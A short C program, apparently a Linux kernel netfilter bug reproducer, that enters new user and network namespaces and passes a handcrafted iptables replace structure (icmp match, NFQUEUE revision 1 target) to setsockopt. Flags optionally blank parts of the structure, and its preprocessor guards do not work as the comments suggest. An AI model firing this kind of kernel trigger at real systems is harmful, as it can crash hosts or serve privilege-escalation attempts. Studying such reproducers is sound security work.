/*
 * removing completly one or more of the user data
 * make rm_replace=1 rm_entry=1 rm_match=1 rm_target=1 test2
 * OR
 * make test2
 
 */
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv4/ip_tables.h>

int main(int argc, char *argv[]) {
  
  ////////////// ARGS FROM MAKEFILE //////////
  if(argc < 5){
     printf("No argument passed through command line: %d\n",argc);
    return -1;
  }

  int remove_replace = atoi(argv[1]);
  int remove_entry = atoi(argv[2]);
  int remove_match = atoi(argv[3]);
  int remove_target = atoi(argv[4]);
  /////////////////////////////////////////////
  
  int s;

  if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) != 0) err(1, "unshare(CLONE_NEWNET)");

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) err(1, "socket");

  struct {
    #if !remove_replace //remove replace
      struct ipt_replace replace;
    #endif
    #if !remove_entry//remove entry
      struct ipt_entry entry;
    #endif
    #if !remove_match //remove match
      struct xt_entry_match match;
    #endif
    #if !remove_target //remove target
      struct xt_entry_target target;
    #endif  
  } data = {0};

  //remove replace
  if(!remove_replace){
      data.replace.num_counters = 1;
      data.replace.num_entries = 1;
      data.replace.size = ( (remove_entry?0:sizeof(data.entry)) + (remove_match?0:sizeof(data.match)) +
                          sizeof(data.target));
  }

  //remove entry
  if(!remove_entry){
      data.entry.next_offset = (sizeof(data.entry) + (remove_match?0:sizeof(data.match)) +
                              sizeof(data.target));
      data.entry.target_offset =
        (sizeof(data.entry) + (remove_match?0:sizeof(data.match)) );
  }
  
  //remove match
  if(!remove_match){
      data.match.u.match_size = (sizeof(data.match));
      data.match.u.user.match_size = (sizeof(data.match));
      strcpy(data.match.u.user.name, "icmp");
      data.match.u.user.revision = 0;
  }
 
 if(!remove_target){
  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;
 }

  // //make socket call
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT)
      err(1, "Error: ip_tables module is not loaded");
  }

  close(s);

  return 0;
}